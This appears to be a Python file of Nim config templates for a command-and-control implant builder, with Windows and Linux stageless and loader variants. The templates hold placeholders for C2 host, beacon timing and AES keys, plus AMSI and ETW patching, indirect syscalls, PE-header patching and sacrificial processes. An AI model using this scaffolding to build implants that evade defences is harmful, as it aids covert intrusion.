global_nim = {
    "windows/stageless": """const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"
import tables

var buildTag* = obf("<buildTag>")
var channel* = obf("<channel>")
var host* = obf("<host>")
var port* = obf("<port>")
var path* = obf("<path>")
var hostTag* = obf("<hostTag>")
var bodyContent* = initTable[string, string]()
var customCommunication* = obf("<customCommunication>")
var serverResponseTemplate* = obf("<serverResponseTemplate>")
var customCookies* = initTable[string, string]()
var customHeaders* = initTable[string, string]()
var beaconDelay* = 867530901
var jitter* = 867530902
var secondDelay* = 867530904
var secondDelayEnabled* = 867530905
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesId* = obf("<aesId>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
const sleepMask* = "<sleepMask>"
var syscallMethod* = obf("indirect")
var syscallReady* = false
var ssns* = initTable[string, culong]()
var syscallStubs* = initTable[string, pointer]()
var sacrificeProcess* = obf(r"C:\\Windows\\System32\\notepad.exe")
var etwPatch* = obf("<etwPatch>")
var amsiPatch* = obf("<amsiPatch>")
var amsiPatchMode* = obf("scan_only_patch")
# var dynamicAmsiPatch* = obf("on")
var amsiAlreadyPatched* = false
var etwAlreadyPatched* = false
var peHeadersPatch* = obf("<peHeadersPatch>")
var peHeadersPatched* = false
var bgWorkers* = 0
var activeRelayPaths*: seq[string] = @[]
var currentToken* = obf("empty")
""",
    "windows/loader": """const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"
import tables

var channel* = obf("<channel>")
var url* = obf("<url>")
var hostTag* = obf("<hostTag>")
var beaconDelay* = 867530903
var jitter* = 867530902
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesId* = obf("<aesId>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
const sleepMask* = "<sleepMask>"
var syscallMethod* = obf("<syscallMethod>")
var syscallReady* = false
var ssns* = initTable[string, culong]()
var syscallStubs* = initTable[string, pointer]()
var sacrificeProcess* = obf(r"C:\\Windows\\System32\\mspaint.exe")
var etwPatch* = obf("<etwPatch>")
var amsiPatch* = obf("<amsiPatch>")
var amsiAlreadyPatched* = false
var etwAlreadyPatched* = false
var peHeadersPatch* = obf("<peHeadersPatch>")
var peHeadersPatched* = false
var bgWorkers* = 0
""",
    "linux/stageless": """const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"
import tables

var channel* = obf("<channel>")
var host* = obf("<host>")
var port* = obf("<port>")
var path* = obf("<path>")
var hostTag* = obf("<hostTag>")
var bodyContent* = initTable[string, string]()
var customCommunication* = obf("<customCommunication>")
var serverResponseTemplate* = obf("<serverResponseTemplate>")
var customCookies* = initTable[string, string]()
var customHeaders* = initTable[string, string]()
var beaconDelay* = 867530901
var secondDelay* = 867530904
var secondDelayEnabled* = 867530905
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
var bgWorkers* = 0
var activeRelayPaths*: seq[string] = @[]
""",
    "linux/loader": """const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"

var channel* = obf("<channel>")
var url* = obf("<url>")
var hostTag* = obf("<hostTag>")
var beaconDelay* = 867530903
var jitter* = 867530902
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
""",
}

custom_routine_nim = {
    "windows/stageless": "proc main*() = discard\n",
    "linux/stageless": "proc main*() = discard\n",
    "windows/loader": "proc main*() = discard\n",
    "linux/loader": "proc main*() = discard\n",
}

custom_nim = {
    "windows/stageless": """proc preface*() =
  discard
""",
    "windows/loader": "proc preface*() = discard\n",
    "linux/stageless": "proc preface*() = discard\n",
    "linux/loader": "proc preface*() = discard\n",
}
